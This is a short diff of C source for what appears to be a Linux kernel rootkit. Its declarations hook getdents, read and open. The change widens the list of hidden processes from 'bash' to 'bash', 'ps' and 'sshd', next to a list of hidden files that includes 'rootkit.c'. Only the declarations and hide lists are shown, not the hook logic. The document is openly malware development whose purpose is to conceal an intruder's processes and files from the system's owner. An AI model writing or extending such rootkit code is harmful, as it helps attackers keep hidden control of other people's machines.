@@ -68,7 +68,8 @@ asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsi
 asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count);
 asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode);
 
-char *HIDDEN_PROCESS = "bash";
+// List of processes to hide from ps
+char * HIDDEN_PROCESSES[] = {"bash", "ps", "sshd"};
 
 // List of files to hide from getdents and open
 const char * const HIDDEN_FILES[] = {"hideme.txt", "rootkit.c", "includes.h", 
